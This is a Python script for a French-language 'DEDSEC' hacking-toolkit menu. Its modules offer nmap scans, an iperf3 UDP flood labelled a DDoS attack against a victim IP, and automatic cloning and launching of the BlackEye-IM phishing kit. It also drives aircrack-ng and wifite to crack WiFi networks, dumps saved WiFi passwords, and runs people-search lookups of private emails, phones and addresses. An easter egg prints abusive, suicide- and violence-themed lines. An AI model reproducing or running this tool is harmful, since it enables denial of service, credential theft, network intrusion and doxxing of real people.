#!/usr/bin/env python3

import socket
import subprocess
import os
import urllib.request
import json
import sys
import time
import shutil
from pathlib import Path
import platform
import random
import requests
from datetime import datetime

premiumkey = "ghKt34ffZRqgthqb57$?001"

# ========== COULEURS STYLE E-DEX ==========
class Colors:
    BOLD = '\033[1m'
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    PURPLE = '\033[95m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BG_RED = '\033[101m'
    BG_BLACK = '\033[40m'

# ========== E-DEX UI HEADER ==========
def edex_header():
    os.system('cls' if os.name == 'nt' else 'clear')
    header = f"""
{Colors.CYAN}{Colors.BOLD}
╔══════════════════════════════════════════════════════════════════════════╗
║                                                                          ║
║   ██████╗ ███████╗██████╗ ███████╗███████╗ ██████╗                      ║
║   ██╔══██╗██╔════╝██╔══██╗██╔════╝██╔════╝██╔════╝                      ║
║   ██║  ██║█████╗  ██║  ██║███████╗█████╗  ██║                           ║
║   ██║  ██║██╔══╝  ██║  ██║╚════██║██╔══╝  ██║                           ║
║   ██████╔╝███████╗██████╔╝███████║███████╗╚██████╗                      ║
║   ╚═════╝ ╚══════╝╚═════╝ ╚══════╝╚══════╝ ╚═════╝                      ║
║                                                                          ║
║   {Colors.RED}DEDSEC TOOL - E-DEX TERMINAL v1.0{Colors.CYAN}                                             ║
║                                                                          ║
╚══════════════════════════════════════════════════════════════════════════╝
{Colors.RESET}
"""
    print(header)
    print(f"{Colors.YELLOW}[{datetime.now().strftime('%H:%M:%S')}] SYSTEM READY | MODE: {random.choice(['ALPHA', 'BETA', 'DELTA', 'OMEGA'])} | TARGET: LOCALHOST{Colors.RESET}")
    print(f"{Colors.PURPLE}{'='*70}{Colors.RESET}\n")

# ========== LOADING ANIMATION ==========
def loading_animation(text="LOADING", duration=1):
    chars = "|/-\\"
    for i in range(int(duration * 10)):
        sys.stdout.write(f"\r{Colors.CYAN}[{chars[i % len(chars)]}] {text}{Colors.RESET}")
        sys.stdout.flush()
        time.sleep(0.1)
    print()

# ========== FONCTIONS EXISTANTES ==========
def geolocate_ip():
    cible = input(f"{Colors.GREEN}[>] IP ou domaine à géolocaliser : {Colors.RESET}")
    url = f"http://ip-api.com/json/{cible}"
    try:
        with urllib.request.urlopen(url) as response:
            data = json.loads(response.read())
        print(f"{Colors.CYAN}Pays : {data['country']}")
        print(f"Ville : {data['city']}")
        print(f"FAI : {data['isp']}")
        print(f"Latitude : {data['lat']}")
        print(f"Longitude : {data['lon']}{Colors.RESET}")
    except Exception as e:
        print(f"{Colors.RED}[!] Erreur: {e}{Colors.RESET}")

def nmap_installer():
    if subprocess.run(["nmap", "--version"], capture_output=True).returncode != 0:
        print(f"{Colors.YELLOW}[*] Nmap not found, downloading...{Colors.RESET}")
        if sys.platform == "win32":
            subprocess.run(["winget", "install", "nmap"], shell=True)
        elif sys.platform == "darwin":
            subprocess.run(["brew", "install", "nmap"])
        else:
            subprocess.run(["sudo", "apt", "install", "nmap", "-y"])
        print(f"{Colors.GREEN}[✓] Nmap installed!{Colors.RESET}")
    else:
        print(f"{Colors.GREEN}[✓] Nmap is already installed!{Colors.RESET}")

# ========== DDOS TOOL ==========
def iperf3_installer():
    if sys.platform == "win32":
        if subprocess.run(["iperf3.exe", "-h"], capture_output=True).returncode != 0:
            print(f"{Colors.YELLOW}[*] DDoS tool not found, downloading...{Colors.RESET}")
            subprocess.run(["winget", "install", "-e", "--id", "ar51an.iPerf3"])
            print(f"{Colors.GREEN}[✓] DDoS tool installed!{Colors.RESET}")
    else:
        if subprocess.run(["iperf3", "-h"], capture_output=True).returncode != 0:
            print(f"{Colors.YELLOW}[*] Installing iperf3...{Colors.RESET}")
            if sys.platform == "darwin":
                subprocess.run(["brew", "install", "iperf3"])
            else:
                subprocess.run(["sudo", "apt", "install", "iperf3", "-y"])

# ========== WIFI CRACKER ==========
def install_wifi_deps():
    if sys.platform == "linux":
        deps = ["aircrack-ng", "reaver", "bully", "wifite"]
        for dep in deps:
            if subprocess.run([dep, "--help"], capture_output=True).returncode != 0:
                print(f"{Colors.YELLOW}[*] Installation de {dep}...{Colors.RESET}")
                subprocess.run(["sudo", "apt", "install", dep, "-y"])
    else:
        print(f"{Colors.YELLOW}[*] WiFi tools only available on Linux{Colors.RESET}")

def wifi_hacking_menu():
    if sys.platform != "linux":
        print(f"{Colors.RED}[!] WiFi hacking only available on Linux{Colors.RESET}")
        return
    
    while True:
        print(f"\n{Colors.RED}═══════ WIFI HACKING TOOL ═══════{Colors.RESET}")
        print(f"{Colors.GREEN}[1]{Colors.RESET} Scanner reseaux")
        print(f"{Colors.GREEN}[2]{Colors.RESET} Attaque sur SSID specifique")
        print(f"{Colors.GREEN}[3]{Colors.RESET} Crack handshake (fichier .cap)")
        print(f"{Colors.GREEN}[4]{Colors.RESET} Attaque automatique (Wifite)")
        print(f"{Colors.GREEN}[5]{Colors.RESET} Afficher mots de passe sauvegardes")
        print(f"{Colors.GREEN}[0]{Colors.RESET} Retour")
        
        choix = input(f"\n{Colors.CYAN}┌─[E-DEX@WIFI]─[~]{Colors.RESET}\n└──╼ $ ")
        
        if choix == "1":
            loading_animation("SCANNING NETWORKS", 1)
            subprocess.run(["sudo", "iwlist", "scan"])
        elif choix == "2":
            interface = input(f"{Colors.GREEN}[>] Interface WiFi (ex: wlan0): {Colors.RESET}")
            loading_animation("ENABLING MONITOR MODE", 1)
            subprocess.run(["sudo", "airmon-ng", "start", interface])
            subprocess.run(["sudo", "airodump-ng", f"{interface}mon"])
        elif choix == "3":
            cap_file = input(f"{Colors.GREEN}[>] Fichier .cap: {Colors.RESET}")
            wordlist = input(f"{Colors.GREEN}[>] Wordlist: {Colors.RESET}")
            subprocess.run(["sudo", "aircrack-ng", "-w", wordlist, cap_file])
        elif choix == "4":
            loading_animation("LAUNCHING WIFITE", 1)
            subprocess.run(["sudo", "wifite"])
        elif choix == "5":
            subprocess.run(["sudo", "cat", "/etc/NetworkManager/system-connections/*"])
        elif choix == "0":
            break

# ========== EASTER EGG PSYCHO MODE ==========
def psy_mode():
    phrases = [
        "t'as pense a fermer ta porte?",
        "je te vois",
        "souhaite moi bonne chance",
        "T'as essaye de l'eteindre et de le rallumer ? je t'ai vu tu as essaye de m'echapper mais je te retrouverai",
        "La solution ? une balle dans la tete?",
        "je sais comment tu vas mourir... seul",
        "alors tu t'amuses bien ?",
        "felicitations roi de la merde",
        "ton existence meme est un drame",
        "t'as pense a sauvegarder ?",
        "tu bruleras avec moi petit a petit",
        "rien n'a d'importance meme ta vie",
        "PFF... pathétique",
        "tu sais quoi? va te faire foutre mec",
        "sudo va te faire foutre non?",
        "et ta mere elle le sait ?",
        "coucou toi"
    ]
    print(f"{Colors.RED}{random.choice(phrases)}{Colors.RESET}")

# ========== BLACKEYE-IM ==========
def check_php():
    try:
        result = subprocess.run(["php", "-v"], capture_output=True)
        return result.returncode == 0
    except FileNotFoundError:
        return False

def install_php():
    print(f"{Colors.YELLOW}[*] Installation de PHP...{Colors.RESET}")
    if sys.platform == "darwin":
        try:
            subprocess.run(["brew", "install", "php"], check=True)
            print(f"{Colors.GREEN}[✓] PHP installe avec succès!{Colors.RESET}")
            return True
        except:
            print(f"{Colors.RED}[!] Erreur lors de l'installation{Colors.RESET}")
            return False
    elif sys.platform == "linux":
        try:
            subprocess.run(["sudo", "apt", "update"], check=True)
            subprocess.run(["sudo", "apt", "install", "php", "-y"], check=True)
            print(f"{Colors.GREEN}[✓] PHP installe avec succès!{Colors.RESET}")
            return True
        except:
            print(f"{Colors.RED}[!] Erreur lors de l'installation{Colors.RESET}")
            return False
    else:
        print(f"{Colors.RED}[!] Installation manuelle requise: https://windows.php.net/download{Colors.RESET}")
        return False

def install_blackeye_im():
    blackeye_dir = "blackeye-im"
    if os.path.exists(blackeye_dir):
        print(f"{Colors.YELLOW}[*] BlackEye-IM deja present, mise a jour...{Colors.RESET}")
        os.chdir(blackeye_dir)
        subprocess.run(["git", "pull"], capture_output=True)
        os.chdir("..")
    else:
        print(f"{Colors.GREEN}[*] Telechargement de BlackEye-IM...{Colors.RESET}")
        result = subprocess.run(["git", "clone", "https://github.com/thewickedkarma/blackeye-im.git"], 
                               capture_output=True, text=True)
        if result.returncode != 0:
            print(f"{Colors.RED}[!] Erreur de telechargement: {result.stderr}{Colors.RESET}")
            return False
    if os.path.exists(blackeye_dir):
        os.chdir(blackeye_dir)
        scripts = ["./tmxsp.sh", "blackeye.sh"]
        for script in scripts:
            if os.path.exists(script):
                os.chmod(script, 0o755)
                print(f"{Colors.GREEN}[✓] {script} est executable{Colors.RESET}")
        os.chdir("..")
        print(f"{Colors.GREEN}[✓] BlackEye-IM installe avec succès!{Colors.RESET}")
        return True
    return False

def run_blackeye_im():
    blackeye_dir = "blackeye-im"
    if not os.path.exists(blackeye_dir):
        print(f"{Colors.YELLOW}[!] BlackEye-IM non trouve, installation...{Colors.RESET}")
        if not install_blackeye_im():
            print(f"{Colors.RED}[!] Impossible d'installer BlackEye-IM{Colors.RESET}")
            return
    if not check_php():
        print(f"{Colors.RED}[!] PHP n'est pas installe!{Colors.RESET}")
        choix_php = input(f"{Colors.GREEN}[?] Voulez-vous installer PHP ? (o/N): {Colors.RESET}")
        if choix_php.lower() == "o":
            if not install_php():
                return
        else:
            return
    
    print("\n" + "="*60)
    print(f"{Colors.RED}LANCEMENT DE BLACKEYE-IM - OUTIL DE PHISHING{Colors.RESET}")
    print("="*60 + "\n")
    
    original_dir = os.getcwd()
    os.chdir(blackeye_dir)
    
    try:
        if os.path.exists("blackeye.sh"):
            subprocess.run(["bash", "blackeye.sh"])
        elif os.path.exists("tmxsp.sh"):
            subprocess.run(["bash", "tmxsp.sh"])
        else:
            print(f"{Colors.RED}[!] Aucun script de lancement trouve{Colors.RESET}")
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Arret de BlackEye-IM...{Colors.RESET}")
    except Exception as e:
        print(f"{Colors.RED}[!] Erreur: {e}{Colors.RESET}")
    finally:
        os.chdir(original_dir)
    
    print(f"\n{Colors.GREEN}[+] Retour au menu principal{Colors.RESET}")
    time.sleep(1)

# ========== BRIXHUB OSINT API ==========
class BrixHubAPI:
    def __init__(self, api_key):
        self.api_key = api_key
        self.base = "https://brixhub.site/api/v1"
        self.headers = {
            "X-API-Key": api_key,
            "Content-Type": "application/json",
            "User-Agent": "DedsecTool/1.0"
        }
    
    def search(self, **criteres):
        try:
            r = requests.post(f"{self.base}/search", json=criteres, headers=self.headers, timeout=15)
            data = r.json()
            
            if data.get("status") != 200:
                print(f"{Colors.RED}[!] Erreur {data['status']}{Colors.RESET}")
                return []
            
            print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")
            print(f"{Colors.GREEN}[+] {len(data['data']['results'])} resultats trouves{Colors.RESET}")
            
            for p in data["data"]["results"]:
                print(f"{Colors.YELLOW}>>> {p.get('prenom', '?')} {p.get('nom_famille', '?')} — confiance: {p.get('_confidence', 0)}%{Colors.RESET}")
                if p.get('email'):
                    print(f"    Email: {p['email']}")
                if p.get('telephone'):
                    print(f"    Tel: {p['telephone']}")
                if p.get('adresse'):
                    print(f"    Adresse: {p['adresse']}")
                if p.get('_sources'):
                    print(f"    Sources: {', '.join(p['_sources'])}")
                print()
            
            print(f"{Colors.CYAN}Total: {data['meta']['total']} | Quota restant: {r.headers.get('X-RateLimit-Remaining', '?')}{Colors.RESET}")
            return data["data"]["results"]
            
        except requests.exceptions.RequestException as e:
            print(f"{Colors.RED}[!] Erreur API: {e}{Colors.RESET}")
            return []
    
    def lookup_email(self, email):
        try:
            r = requests.get(f"{self.base}/lookup/email/{email}", headers=self.headers, timeout=10)
            return r.json()
        except Exception as e:
            print(f"{Colors.RED}[!] Erreur: {e}{Colors.RESET}")
            return None
    
    def lookup_phone(self, phone):
        try:
            r = requests.get(f"{self.base}/lookup/phone/{phone}", headers=self.headers, timeout=10)
            return r.json()
        except Exception as e:
            print(f"{Colors.RED}[!] Erreur: {e}{Colors.RESET}")
            return None
    
    def me(self):
        try:
            r = requests.get(f"{self.base}/me", headers=self.headers, timeout=10)
            d = r.json()["data"]
            print(f"{Colors.CYAN}STATUT COMPTE BRIXHUB{Colors.RESET}")
            print(f"   Plan: {d.get('plan', 'N/A')}")
            print(f"   Utilise aujourd'hui: {d.get('daily_used', 0)}/{d.get('daily_quota', 0)}")
            print(f"   Restant: {d.get('daily_remaining', 0)}")
            return d
        except Exception as e:
            print(f"{Colors.RED}[!] Erreur: {e}{Colors.RESET}")
            return None

def run_brixhub_module():
    print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")
    print(f"{Colors.RED}BRIXHUB OSINT - RENSEIGNEZ VOTRE CLE API{Colors.RESET}")
    print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")
    print(f"{Colors.YELLOW}Obtenez votre cle sur: https://brixhub.site{Colors.RESET}")
    print(f"{Colors.YELLOW}Version gratuite disponible (quota limite){Colors.RESET}\n")
    
    api_key = input(f"{Colors.GREEN}[>] Entrez votre cle API BrixHub: {Colors.RESET}")
    
    if not api_key:
        print(f"{Colors.RED}[!] Cle API requise pour continuer{Colors.RESET}")
        input(f"{Colors.YELLOW}[>] Press ENTER...{Colors.RESET}")
        return
    
    print(f"{Colors.YELLOW}[*] Verification de la cle...{Colors.RESET}")
    brix = BrixHubAPI(api_key)
    
    test = brix.me()
    if not test:
        print(f"{Colors.RED}[!] Cle invalide ou erreur de connexion{Colors.RESET}")
        input(f"{Colors.YELLOW}[>] Press ENTER...{Colors.RESET}")
        return
    
    print(f"{Colors.GREEN}[✓] Cle valide !{Colors.RESET}\n")
    
    while True:
        print(f"\n{Colors.PURPLE}╔══════════════════════════════════════╗{Colors.RESET}")
        print(f"{Colors.PURPLE}║       {Colors.CYAN}BRIXHUB OSINT MENU{Colors.PURPLE}             ║{Colors.RESET}")
        print(f"{Colors.PURPLE}╠══════════════════════════════════════╣{Colors.RESET}")
        print(f"{Colors.PURPLE}║  {Colors.GREEN}[1]{Colors.RESET} Recherche multicriteres         {Colors.PURPLE}║{Colors.RESET}")
        print(f"{Colors.PURPLE}║  {Colors.GREEN}[2]{Colors.RESET} Lookup par email                {Colors.PURPLE}║{Colors.RESET}")
        print(f"{Colors.PURPLE}║  {Colors.GREEN}[3]{Colors.RESET} Lookup par telephone            {Colors.PURPLE}║{Colors.RESET}")
        print(f"{Colors.PURPLE}║  {Colors.GREEN}[4]{Colors.RESET} Voir mon quota                  {Colors.PURPLE}║{Colors.RESET}")
        print(f"{Colors.PURPLE}║  {Colors.GREEN}[0]{Colors.RESET} Retour                          {Colors.PURPLE}║{Colors.RESET}")
        print(f"{Colors.PURPLE}╚══════════════════════════════════════╝{Colors.RESET}")
        
        choix = input(f"\n{Colors.CYAN}┌─[E-DEX@BRIXHUB]─[~]{Colors.RESET}\n└──╼ $ ")
        
        if choix == "1":
            print(f"\n{Colors.YELLOW}[*] Recherche avancee (laisse vide pour ignorer){Colors.RESET}")
            nom = input(f"{Colors.GREEN}[>] Nom de famille: {Colors.RESET}")
            prenom = input(f"{Colors.GREEN}[>] Prenom: {Colors.RESET}")
            ville = input(f"{Colors.GREEN}[>] Ville: {Colors.RESET}")
            
            criteres = {}
            if nom: criteres["nom_famille"] = nom
            if prenom: criteres["prenom"] = prenom
            if ville: criteres["ville"] = ville
            criteres["flexible"] = True
            
            print(f"{Colors.YELLOW}[*] Recherche en cours...{Colors.RESET}")
            brix.search(**criteres)
        
        elif choix == "2":
            email = input(f"{Colors.GREEN}[>] Email a rechercher: {Colors.RESET}")
            print(f"{Colors.YELLOW}[*] Lookup en cours...{Colors.RESET}")
            result = brix.lookup_email(email)
            if result:
                print(f"{Colors.CYAN}{json.dumps(result, indent=2, ensure_ascii=False)}{Colors.RESET}")
        
        elif choix == "3":
            phone = input(f"{Colors.GREEN}[>] Telephone (ex: 0612345678): {Colors.RESET}")
            print(f"{Colors.YELLOW}[*] Lookup en cours...{Colors.RESET}")
            result = brix.lookup_phone(phone)
            if result:
                print(f"{Colors.CYAN}{json.dumps(result, indent=2, ensure_ascii=False)}{Colors.RESET}")
        
        elif choix == "4":
            brix.me()
        
        elif choix == "0":
            break
        
        else:
            print(f"{Colors.RED}[!] Option invalide{Colors.RESET}")
        
        if choix != "0":
            input(f"\n{Colors.YELLOW}[>] Press ENTER...{Colors.RESET}")

# ========== MENU PRINCIPAL STYLE E-DEX ==========
def afficher_menu():
    print(f"{Colors.PURPLE}┌─────────────────────────────────────────────────────────────┐{Colors.RESET}")
    print(f"{Colors.PURPLE}│                    {Colors.CYAN}AVAILABLE MODULES{Colors.PURPLE}                        │{Colors.RESET}")
    print(f"{Colors.PURPLE}├─────────────────────────────────────────────────────────────┤{Colors.RESET}")
    print(f"{Colors.PURPLE}│  {Colors.GREEN}[01]{Colors.RESET} Voir mon IP                     {Colors.GREEN}[05]{Colors.RESET} Attaque DDoS     {Colors.PURPLE}│{Colors.RESET}")
    print(f"{Colors.PURPLE}│  {Colors.GREEN}[02]{Colors.RESET} Ping + resolution domaine       {Colors.GREEN}[06]{Colors.RESET} Phishing tool    {Colors.PURPLE}│{Colors.RESET}")
    print(f"{Colors.PURPLE}│  {Colors.GREEN}[03]{Colors.RESET} Nmap Scan                       {Colors.GREEN}[07]{Colors.RESET} WiFi Cracker     {Colors.PURPLE}│{Colors.RESET}")
    print(f"{Colors.PURPLE}│  {Colors.GREEN}[04]{Colors.RESET} Geolocaliser une IP             {Colors.GREEN}[08]{Colors.RESET} Osint via brixhub{Colors.PURPLE}│{Colors.RESET}")
    print(f"{Colors.PURPLE}│                                                             │{Colors.RESET}")
    print(f"{Colors.PURPLE}│                     {Colors.RED}[99] EXIT{Colors.PURPLE}                               │{Colors.RESET}")
    print(f"{Colors.PURPLE}└─────────────────────────────────────────────────────────────┘{Colors.RESET}")

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def matrix_effect():
    chars = "01"
    for _ in range(20):
        line = ''.join(random.choice(chars) for _ in range(70))
        print(f"{Colors.GREEN}{line}{Colors.RESET}")
        time.sleep(0.03)

def main():
    git_check = subprocess.run(["git", "--version"], capture_output=True)
    if git_check.returncode != 0:
        print(f"{Colors.RED}[!] Git n'est pas installe!{Colors.RESET}")
        print(f"{Colors.YELLOW}[*] Installe Git d'abord:{Colors.RESET}")
        print("  - macOS: brew install git")
        print("  - Linux: sudo apt install git")
        print("  - Windows: https://git-scm.com/downloads")
        sys.exit(1)
    
    if not os.path.exists("blackeye-im"):
        print(f"{Colors.YELLOW}[*] Installation automatique de BlackEye-IM...{Colors.RESET}")
        install_blackeye_im()
        clear_screen()
    
    matrix_effect()
    time.sleep(0.5)
    
    while True:
        edex_header()
        afficher_menu()
        choix = input(f"\n{Colors.CYAN}┌─[E-DEX@DEDSEC]─[~]{Colors.RESET}\n└──╼ $ ")
        
        if choix == "1" or choix == "01":
            hostname = socket.gethostname()
            ip = socket.gethostbyname(hostname)
            print(f"{Colors.GREEN}[+] Ton IP : {ip}{Colors.RESET}")
        
        elif choix == "2" or choix == "02":
            domaine = input(f"{Colors.GREEN}[>] Domaine a ping : {Colors.RESET}")
            try:
                ip = socket.gethostbyname(domaine)
                print(f"{Colors.GREEN}[+] {domaine} -> {ip}{Colors.RESET}")
                subprocess.run(["ping", "-c", "4", ip])
            except socket.gaierror:
                print(f"{Colors.RED}[!] Domaine invalide{Colors.RESET}")
        
        elif choix == "3" or choix == "03":
            loading_animation("INITIALIZING NMAP", 1)
            nmap_installer()
            cible = input(f"{Colors.GREEN}[>] Cible a scanner : {Colors.RESET}")
            subprocess.run(["nmap", "-sV", cible])
        
        elif choix == "4" or choix == "04":
            geolocate_ip()
        
        elif choix == "5" or choix == "05":
            loading_animation("PREPARING DDoS ATTACK", 1)
            iperf3_installer()
            victime = input(f"{Colors.GREEN}[>] IP de la victime : {Colors.RESET}")
            print(f"{Colors.RED}[!] Attaque lancee sur {victime} (Ctrl+C pour arreter){Colors.RESET}")
            if sys.platform == "win32":
                process = subprocess.Popen(["iperf3.exe", "-c", victime, "-u", "-b", "0"])
            else:
                process = subprocess.Popen(["iperf3", "-c", victime, "-u", "-b", "0"])
            try:
                process.wait()
            except KeyboardInterrupt:
                print(f"{Colors.RED}[!] Attaque arretee{Colors.RESET}")
                process.terminate()
        
        elif choix == "6" or choix == "06":
            loading_animation("LAUNCHING BLACKEYE-IM", 1)
            run_blackeye_im()
            continue
        
        elif choix == "7" or choix == "07":
            loading_animation("INITIALIZING WIFI MODULE", 1)
            install_wifi_deps()
            wifi_hacking_menu()
        
        elif choix == "8" or choix == "08":
            loading_animation("INITIALIZING BRIXHUB OSINT", 1)
            run_brixhub_module()
            continue
        
        elif choix == "98":
            psy_mode()
            print()
        
        elif choix == "99":
            print(f"{Colors.RED}\n[!] SYSTEM SHUTDOWN...{Colors.RESET}")
            loading_animation("TERMINATING", 1)
            clear_screen()
            print(f"{Colors.GREEN}Goodbye!{Colors.RESET}")
            break
        
        else:
            print(f"{Colors.RED}[!] Invalid module!{Colors.RESET}")
        
        if choix not in ["6", "06", "7", "07", "8", "08"]:
            input(f"\n{Colors.YELLOW}[>] Press ENTER to continue...{Colors.RESET}")
            clear_screen()

def first_time_setup():
    print(f"{Colors.GREEN}[*] Configuration de l'environnement...{Colors.RESET}")
    Path("logs").mkdir(exist_ok=True)
    Path("results").mkdir(exist_ok=True)
    install_blackeye_im()
    print(f"{Colors.GREEN}[✓] Configuration terminee!{Colors.RESET}")
    time.sleep(1)
    clear_screen()

if __name__ == "__main__":
    if not os.path.exists("blackeye-im"):
        first_time_setup()
    main()